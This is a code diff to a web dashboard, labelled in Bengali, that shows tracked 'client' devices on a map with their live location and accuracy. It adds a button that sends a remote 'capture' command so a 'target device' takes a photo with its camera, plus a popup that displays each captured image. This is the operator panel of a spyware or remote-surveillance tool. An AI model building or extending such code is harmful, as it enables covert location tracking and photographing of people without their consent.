@@ -20,6 +20,16 @@
         .device-card .detail b { color: #e2e8f0; }
         .online { border-left-color: #22c55e; }
         .no-data { text-align: center; color: #64748b; margin-top: 50px; }
+        
+        /* বাটন স্টাইল */
+        .capture-btn { background: #ef4444; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 12px; cursor: pointer; margin-top: 10px; width: 100%; font-weight: bold; }
+        .capture-btn:hover { background: #dc2626; }
+
+        /* মডাল (ছবি দেখানোর জন্য) */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
+        .modal-content { background: #1e293b; padding: 20px; border-radius: 10px; max-width: 90%; max-height: 90%; text-align: center; }
+        .modal-content img { max-width: 100%; max-height: 80vh; border-radius: 5px; }
+        .close-btn { margin-top: 15px; background: #38bdf8; border: none; padding: 10px 20px; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -36,6 +46,15 @@
         </div>
     </div>
 
+    <!-- ছবি দেখানোর মডাল -->
+    <div id="imageModal" class="modal">
+        <div class="modal-content">
+            <img id="modalImage" src="" alt="Captured Photo">
+            <br>
+            <button class="close-btn" onclick="closeModal()">বন্ধ করুন</button>
+        </div>
+    </div>
+
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         let map = L.map('map').setView([23.8103, 90.4125], 12);
@@ -46,6 +65,7 @@
         let markers = {};
         let circles = {};
         let selectedDeviceId = null; 
+        let lastImageTime = {};
 
         function fetchClients() {
             fetch('/api/clients')
@@ -92,8 +112,15 @@
                                 🎯 নির্ভুলতা: <b>${data.accuracy ? Math.round(data.accuracy) + ' মিটার' : 'N/A'}</b><br>
                                 🕒 শেষ আপডেট: <b>${data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A'}</b>
                             </div>
+                            <button class="capture-btn" onclick="event.stopPropagation(); captureImage('${id}')">📸 ছবি তুলুন</button>
                         `;
                         list.appendChild(card);
+
+                        // নতুন ছবি এলে পপআপ দেখানো
+                        if (data.camera_image && data.camera_time && lastImageTime[id] !== data.camera_time) {
+                            lastImageTime[id] = data.camera_time;
+                            showModal(data.camera_image);
+                        }
 
                         if (data.lat && data.lng) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
@@ -118,6 +145,34 @@
                     });
                 })
                 .catch(err => console.error("Error fetching clients:", err));
+        }
+
+        function captureImage(clientId) {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: clientId, command: 'capture' })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    alert("ব্যর্থ: " + data.error);
+                } else {
+                    alert("কমান্ড পাঠানো হয়েছে! টার্গেট ডিভাইসে ক্যামেরা পারমিশন থাকলে ছবি আসবে।");
+                }
+            })
+            .catch(err => console.error("Error sending command:", err));
+        }
+
+        function showModal(imageSrc) {
+            const modal = document.getElementById('imageModal');
+            const img = document.getElementById('modalImage');
+            img.src = imageSrc;
+            modal.style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('imageModal').style.display = 'none';
         }
 
         fetchClients();
